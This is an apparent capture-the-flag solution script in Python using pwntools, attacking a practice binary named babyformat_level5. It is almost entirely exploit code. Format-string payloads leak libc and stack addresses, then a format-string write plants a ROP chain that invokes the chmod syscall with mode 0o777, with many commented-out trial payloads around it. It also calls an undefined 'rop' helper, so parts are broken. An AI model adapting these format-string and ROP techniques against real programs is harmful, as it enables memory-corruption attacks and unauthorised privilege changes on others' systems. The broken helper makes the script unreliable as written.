#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template babyformat_level5
from pwn import *
from os import system

## working code
# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level5')
context.arch = 'amd64'
context.terminal = ["tmux", "splitw", "-h"]

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
# rop = ROP('/lib/x86_64-linux-gnu/libc.so.6')

# payload = b"%04199028d%26$lnAAAAAAA" + p64(0x404060) 
# io.sendline(payload)
# print(io.recvline())

exploit = f"%3$lx %150$p %04199001d%27$lnAA"

payload = exploit.encode() + p64(0x404060)
io.sendline(payload)

io.recvuntil(b"Your input is:")
io.recvline()
leak_bytes = io.recvline(keepends=False)
# print(f"leak_bytes : {leak_bytes}")
leak = leak_bytes.decode().split(' ')
print(f"leak_bytes : {leak[0], leak[1]}")

print(f"leaked_libc_func : {leak[0]}")
leaked_libc_func_int = int(leak[0], 16)
libc_base = leaked_libc_func_int - 0x10e077
print(f"libc_base : 0x{libc_base:x}")

leaked_rbp = leak[1]
print(f"leaked rbp : {leaked_rbp}")
rbp_main = int(leaked_rbp, 16)
rbp_func = rbp_main - 80 
print(f"leaked rbp func : {hex(rbp_func)}")
leaked_ret = rbp_func + 8
rip_func_addr = leaked_ret
print(f"leaked rip func : {hex(leaked_ret)}")
rsp_func=rbp_func-1152 
print(f"rsp_func:0x{rsp_func:x}")

rop_chain_len = len(rop(libc_base))
print("rop chain length ",rop_chain_len)
# rsp - rdi / 8 = 23.1 -> %24lx = buffer address

# p2 = f"%24$pAA".encode() + rop(libc_base) 
# io.sendline(p2)
# io.recvuntil(b"Your input is:")
# print(io.recvline())

# leak_bytes_1 = io.recvline(keepends=False)
# print(f"leak_bytes_1 : {leak_bytes_1}")
# leak1 = leak_bytes_1.split(b'A')
# print(f"leak_bytes_1 : {leak1[0]}")
# buf_addr_int = int(leak1[0], 16)
# buf_addr = buf_addr_int - 41 - 7
# buf_len = len(str(buf_addr))
# print("buf_len", buf_len)
# p3 = f"%{buf_addr}d%26$lnAA".encode() + rop(0x404060) # x = 15 + 6 + 
# io.sendline(p3)

# print("leave ret on exit location started")
# leave_ret=0x578c8 
# p4= b"%0817786d%26$ln" +p64(0x404060)
# io.sendline(p4)
# print("leave ret on exit location completed")
# print(io.recvline())
# print(io.recvline())
# print(io.recvline())
# print(io.recvline())
# print(io.recvline())

# exploit2 = f"%3$lx %150$p"
# io.sendline(exploit2)
# io.recvuntil(b"Your input is:")
# io.recvline()
# leak_bytes2 = io.recvline(keepends=False)
# leak2 = leak_bytes2.decode().split(' ')
# libc_base_2=int(leak2[0], 16) - 0x10e077
# print(f"libc_base_2 : 0x{libc_base_2:x}")
# leaked_rbp_main2 = int(leak2[1], 16)
# leaked_rbp_func2 = leaked_rbp_main2 - 80
# leaked_rip_func2 = leaked_rbp_func2 +8
# print(f"leaked_rbp_main2 : 0x{leaked_rbp_main2:x}")
# print(f"leaked_rbp_func2 : 0x{leaked_rbp_func2:x}")
# print(f"leaked_rip_func2 : 0x{leaked_rip_func2:x}")
# print(f"rbp main difference : {rbp_main - leaked_rbp_main2}")
# print(f"rbp func difference : {rbp_func-leaked_rbp_func2}")
# print(f"rip func difference : {rip_func_addr-leaked_rip_func2}") 
# print(f"libc_base_2 difference: {libc_base-libc_base_2}") 



rbp_func2 = rbp_func - (1*1168) 
new_rsp=rsp_func - (1*1168)
print(f"rbp_func2 : 0x{rbp_func2:x}")
print(f"rsp_func2 : 0x{new_rsp:x}")
base = libc_base
pop_rdi = 0x23b6a
pop_rsi = 0x2601f 
pop_rdx = 0x142c92 
pop_rax = 0x36174  
syscall = 0x2284d  
rip = rbp_func2+8 

p5 = b"A"*7 + fmtstr_payload(24, {
    0x404060 : p64(base+0x578c8).ljust(8, b"\x00"),
    new_rsp : p64(base + pop_rdi).ljust(8, b"\x00"),
    new_rsp + 8 : p64(base + 0x1eb1f3).ljust(8, b"\x00"),
    new_rsp + 16 : p64(base + pop_rsi).ljust(8, b"\x00"),
    new_rsp + 24 : p64(0o777),
    new_rsp + 32 : p64(base + pop_rdx).ljust(8, b"\x00"),
    new_rsp + 40 : p64(0),
    new_rsp + 48 : p64(base + pop_rax).ljust(8, b"\x00"),
    new_rsp + 56 : p64(0x5a),
    new_rsp + 64 : p64(base + 0x2284d).ljust(8, b"\x00")
    }, numbwritten=48, write_size='short', strategy='fast')

io.sendline(p5)
io.interactive()

